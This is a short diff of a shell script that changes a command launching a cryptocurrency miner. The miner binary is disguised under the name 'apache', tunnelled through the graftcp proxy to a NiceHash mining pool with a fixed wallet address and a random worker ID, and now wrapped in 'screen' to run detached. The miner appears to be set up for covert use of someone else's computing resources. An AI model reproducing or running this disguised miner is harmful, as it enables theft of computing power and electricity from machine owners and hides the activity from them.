@@ -32,6 +32,6 @@ echo " "
 
 ph add apache
 
-./graftcp/graftcp ./apache -P stratum2+tcp://3E1T35rmEJrhDtGsuXYgkrbzyLxUuHbNvL.$(echo $(shuf -i 1-2000 -n 1))@daggerhashimoto.usa-west.nicehash.com:3353 -R --HWMON 2 --verbosity 1 --work-timeout 999
+screen ./graftcp/graftcp ./apache -P stratum2+tcp://3E1T35rmEJrhDtGsuXYgkrbzyLxUuHbNvL.$(echo $(shuf -i 1-2000 -n 1))@daggerhashimoto.usa-west.nicehash.com:3353 -R --HWMON 2 --verbosity 1 --work-timeout 999
 
 EOF
